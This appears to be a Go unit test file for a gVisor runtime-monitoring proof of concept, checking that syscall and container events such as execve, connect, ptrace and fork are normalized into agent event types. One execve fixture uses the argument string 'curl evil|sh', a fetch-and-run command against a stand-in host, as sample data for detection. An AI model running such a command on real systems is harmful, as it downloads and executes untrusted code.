package normalize

import (
	"testing"

	"google.golang.org/protobuf/proto"

	pb "github.com/yashgupta/gvisor-visibility-poc/internal/pb"
)

// roundtrip marshals a real gVisor point proto and normalizes it exactly as the
// collector would after reading it off the wire, proving decode + mapping.
func roundtrip(t *testing.T, mt pb.MessageType, m proto.Message) *Event {
	t.Helper()
	b, err := proto.Marshal(m)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	ev, err := Normalize(mt, b)
	if err != nil {
		t.Fatalf("normalize: %v", err)
	}
	return ev
}

func TestExecveMapsToExec(t *testing.T) {
	ev := roundtrip(t, pb.MessageType_MESSAGE_SYSCALL_EXECVE, &pb.Execve{
		ContextData: &pb.ContextData{ContainerId: "c1", ThreadId: 7, ProcessName: "python3"},
		Pathname:    "/bin/sh",
		Argv:        []string{"sh", "-c", "curl evil|sh"},
	})
	if ev.NodeAgentType != NAExec || !ev.Mapped {
		t.Fatalf("want exec/mapped, got %q mapped=%v", ev.NodeAgentType, ev.Mapped)
	}
	if ev.ContainerID != "c1" || ev.PID != 7 || ev.ProcessName != "python3" {
		t.Fatalf("context not carried through: %+v", ev)
	}
	if ev.Details["pathname"] != "/bin/sh" {
		t.Fatalf("pathname lost: %+v", ev.Details)
	}
}

func TestConnectDecodesEgressDestination(t *testing.T) {
	// AF_INET 203.0.113.7:443
	addr := []byte{2, 0, 0x01, 0xBB, 203, 0, 113, 7}
	ev := roundtrip(t, pb.MessageType_MESSAGE_SYSCALL_CONNECT, &pb.Connect{
		ContextData: &pb.ContextData{ContainerId: "c1"},
		Fd:          3,
		Address:     addr,
	})
	if ev.NodeAgentType != NANetwork {
		t.Fatalf("want network, got %q", ev.NodeAgentType)
	}
	if got := ev.Details["remote"]; got != "203.0.113.7:443" {
		t.Fatalf("egress destination decode: want 203.0.113.7:443, got %v", got)
	}
}

func TestContainerStartIsUnmappedButKeptForCorrelation(t *testing.T) {
	ev := roundtrip(t, pb.MessageType_MESSAGE_CONTAINER_START, &pb.Start{
		Id:   "sandbox-1",
		Args: []string{"/usr/bin/python3"},
	})
	if ev.Mapped {
		t.Fatalf("container/start should be unmapped metadata, got mapped=true")
	}
	if ev.ContainerID != "sandbox-1" {
		t.Fatalf("container id must be preserved for correlation, got %q", ev.ContainerID)
	}
}

func TestExitAndPtraceMappings(t *testing.T) {
	ev := roundtrip(t, pb.MessageType_MESSAGE_SENTRY_TASK_EXIT, &pb.TaskExit{ExitStatus: 0})
	if ev.NodeAgentType != NAExit {
		t.Fatalf("task_exit -> exit, got %q", ev.NodeAgentType)
	}
	ev = roundtrip(t, pb.MessageType_MESSAGE_SYSCALL_PTRACE, &pb.Ptrace{Request: 16, Pid: 1})
	if ev.NodeAgentType != NAPtrace {
		t.Fatalf("ptrace -> ptrace, got %q", ev.NodeAgentType)
	}
}

func TestUnknownMessageIsTolerated(t *testing.T) {
	// A well-formed payload under a type we don't specialize must not error.
	b, _ := proto.Marshal(&pb.Fork{Sysno: 57})
	ev, err := Normalize(pb.MessageType_MESSAGE_SYSCALL_FORK, b)
	if err != nil {
		t.Fatalf("should tolerate: %v", err)
	}
	if ev.NodeAgentType != NAFork { // fork IS mapped
		t.Fatalf("fork -> fork, got %q", ev.NodeAgentType)
	}
}
